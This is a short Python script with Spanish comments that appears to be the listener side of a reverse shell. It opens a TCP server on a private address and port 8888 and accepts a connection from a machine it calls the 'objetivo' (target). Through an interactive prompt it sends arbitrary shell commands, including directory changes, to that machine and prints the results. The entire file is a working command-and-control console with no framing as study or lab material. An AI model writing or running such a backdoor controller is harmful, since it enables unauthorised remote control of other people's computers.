# _*_ coding utf8 _*_
# netstat -an|findstr PUERTO

import socket

DIRECCION = ("192.168.0.67", 8888)

def iniciarServer():
    global server
    global ip 
    global objetivo

    # Ipv4 (AF_INET) y usa puertos TCP (SOCK_STREAM)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Para que se rehabilite el puerto que usemos.
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    server.bind(DIRECCION)
    server.listen(1)

    print(f"Iniciando servidor y esperando conexión..")

    objetivo, ip = server.accept()
    print(f"Nueva conexión: {ip[0]}")

def detenerServer():
    server.close()

def consola():
    dirActual = objetivo.recv(1024).decode("utf-8")
    while True:
        comando = input(f"{dirActual}>")

        if comando == "salir":
            objetivo.send(bytes(comando, "utf8"))
            break
        elif comando[:2] == "cd":
            objetivo.send(bytes(comando, "utf8"))
            respuesta = objetivo.recv(1024)
            dirActual = respuesta
            print(respuesta)
        elif comando == "":
            pass
        else:
            objetivo.send(bytes(comando, "utf8"))
            resultado = objetivo.recv(2048)
            if resultado == "1":
                continue
            else:   
                print(resultado)

iniciarServer()
consola()
detenerServer()